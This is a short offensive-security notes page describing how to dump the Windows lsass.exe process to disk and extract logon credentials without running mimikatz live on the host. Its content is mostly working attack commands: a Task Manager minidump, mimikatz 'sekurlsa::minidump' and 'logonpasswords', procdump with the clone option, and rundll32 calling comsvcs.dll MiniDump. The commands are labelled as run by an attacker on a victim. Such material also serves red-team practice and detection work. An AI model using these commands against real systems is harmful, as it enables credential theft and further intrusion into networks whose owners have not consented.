# Dumping Lsass.exe to Disk Without Mimikatz and Extracting Credentials

## Task Manager

Create a minidump of the lsass.exe using task manager \(must be running as administrator\):

![](../../.gitbook/assets/screenshot-from-2019-03-12-19-55-27.png)

![](../../.gitbook/assets/screenshot-from-2019-03-12-19-56-12.png)

Swtich mimikatz context to the minidump:

{% code title="attacker@mimikatz" %}
```csharp
sekurlsa::minidump C:\Users\ADMINI~1.OFF\AppData\Local\Temp\lsass.DMP
sekurlsa::logonpasswords
```
{% endcode %}

![](../../.gitbook/assets/screenshot-from-2019-03-12-19-54-15.png)

## Procdump

Procdump from sysinternal's could also be used to dump the process:

{% code title="attacker@victim" %}
```csharp
procdump.exe -accepteula -ma lsass.exe lsass.dmp

// or avoid reading lsass by dumping a cloned lsass process
procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
```
{% endcode %}

![](../../.gitbook/assets/screenshot-from-2019-03-12-20-11-28.png)

![](../../.gitbook/assets/screenshot-from-2019-03-12-20-13-25.png)

## comsvcs.dll

Executing a native comsvcs.dll DLL found in Windows\system32 with rundll32:

```text
.\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
```

![](../../.gitbook/assets/image%20%28233%29.png)

## References

{% embed url="https://t.co/s2VePo3ICo?amp=1" %}

